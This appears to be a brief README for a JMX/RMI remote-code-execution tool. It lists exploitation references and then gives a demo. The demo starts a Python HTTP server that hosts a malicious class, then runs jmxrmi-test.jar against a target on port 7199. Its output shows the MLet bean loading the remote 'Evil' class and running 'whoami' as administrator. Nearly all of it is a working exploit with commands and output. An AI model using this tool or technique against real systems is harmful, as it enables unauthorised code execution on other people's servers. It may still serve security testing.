## Ref
- https://hu3sky.github.io/2020/03/06/JMX-RMI/
- https://www.cnblogs.com/afanti/p/10610682.html
- https://webcache.googleusercontent.com/search?q=cache:https://www.optiv.com/blog/exploiting-jmx-rmi&strip=1&vwsrc=0

## Demo
```
cd web
python3 -m http.server 4141
```

```
java -jar jmxrmi-test.jar 10.x.y.9 7199 whoami "10.x.y.9:4141"
Proxy[RMIServer,RemoteObjectInvocationHandler[UnicastRef [liveRef: [endpoint:[10.x.y.9:45880](remote),objID:[62e13d6f:175545b2b59:-7fff, 5578557230260991526]]]]]
[info] IP is inner IP add a temp IP and port forward..
十月 23, 2020 3:27:01 下午 com.cqq.PortMap forward
信息: 监听端口:45880
URL: service:jmx:rmi:///jndi/rmi://10.x.y.9:7199/jmxrmi, connecting
Connected: rmi://10.m.n.145  1
Trying to create bean...
Loaded javax.management.loading.MLet
Loaded class: com.cqq.Evil object MLetCompromise:name=evil,id=1
Result: cqq\administrator

```